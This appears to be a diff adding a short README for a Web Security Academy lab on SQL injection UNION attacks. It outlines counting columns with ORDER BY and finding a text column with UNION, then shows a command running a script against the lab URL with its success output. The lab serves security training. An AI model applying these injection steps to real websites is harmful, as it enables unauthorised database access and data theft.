@@ -1,0 +1,11 @@
+SQL injection UNION attack, finding a column containing text
+
+Find number of columns using ORDER BY CLAUSE
+
+Find column with string data type using UNION CLAUSE
+
+END GOAL: Find string given in the website
+
+python lab4.py "https://acc71f641f42ee1980841af4002400f6.web-security-academy.net/filter?category=Pets"
+[+] SQL Injection successfull 3
+[+] SQL Injection successfull: column with string is:  2
